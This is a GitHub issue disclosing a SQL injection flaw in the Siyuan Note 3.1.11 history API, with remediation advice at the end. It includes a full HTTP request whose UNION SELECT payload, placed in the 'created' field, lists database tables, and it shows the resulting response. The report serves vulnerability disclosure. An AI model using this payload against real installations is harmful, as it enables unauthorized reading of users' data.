### **[TaiPhung217](/TaiPhung217)** commented [Nov 6, 2024](#issue-2637504514)

| Is there an existing issue for this?  * I have searched the existing issues  Can the issue be reproduced with the default theme (daylight/midnight)?  * I was able to reproduce the issue with the default theme  Could the issue be due to extensions?  * I've ruled out the possibility that the extension is causing the problem.  Describe the problem There is a potential SQL injection vulnerability in version `3.1.11` of the Siyuan Note application. The vulnerability exists in the `POST /api/history/getHistoryItems` endpoint. By sending a request containing a payload, an attacker can exploit this vulnerability to execute arbitrary SQL queries, retrieving data in the database. PoC Steps to Reproduce:   1. Set up the Siyuan Note application version 3.1.11 on a local environment. 2. Send the following request to the /api/history/getHistoryItems endpoint:  ``` POST /api/history/getHistoryItems HTTP/1.1 Host: localhost:6806 Content-Length: 208 sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126" sec-ch-ua-platform: "Windows" Accept-Language: en-US sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://localhost:6806 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:6806/stage/build/desktop/?r=vshr05s Accept-Encoding: gzip, deflate, br Cookie: siyuan=MTczMDg2MTkxNnxEWDhFQVFMX2dBQUJFQUVRQUFCeF80QUFBUVp6ZEhKcGJtY01CZ0FFWkdGMFlRWnpkSEpwYm1jTVZRQlRleUpYYjNKcmMzQmhZMlZ6SWpwN0lpOXphWGwxWVc0dmQyOXlhM053WVdObEx5STZleUpCWTJObGMzTkJkWFJvUTI5a1pTSTZJakV5TXpRaUxDSkRZWEIwWTJoaElqb2lZbWcxY21KMmVTSjlmWDA9fF5xFoKuR_nqED8t-xyAdLUhXwMIaj9E3nswwd1J_2-M; _ga=GA1.1.1190341866.1730861926; _ga_L7WEXVQCR9=GS1.1.1730861926.1.1.1730865252.0.0.0 Connection: keep-alive  {"notebook":"%","query":"","op":"all","type":0,"created":"1728288111111' union select 1,2,(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),4,5,6,7 -- -"}  ```  3. Observe the response containing a list of database tables.  ``` {   "code": 0,   "msg": "",   "data": {     "items": [       {         "title": "4",         "path": "history/6",         "op": "histories_fts_case_insensitive,histories_fts_case_insensitive_data,histories_fts_case_insensitive_idx,histories_fts_case_insensitive_content,histories_fts_case_insensitive_docsize,histories_fts_case_insensitive_config",         "notebook": ""       }     ]   } }  ```  This response shows that the attack successfully returns a list of table names from the database, demonstrating the ability to perform SQL injection attacks.

Use parameterized queries or prepared statements to prevent SQL injection attacks: <https://go.dev/doc/database/prepared-statements> 2. Sanitize and validate all user inputs to avoid malicious queries being executed. 3. Implement appropriate security measures such as input validation and error handling to mitigate the risk of SQL injection.
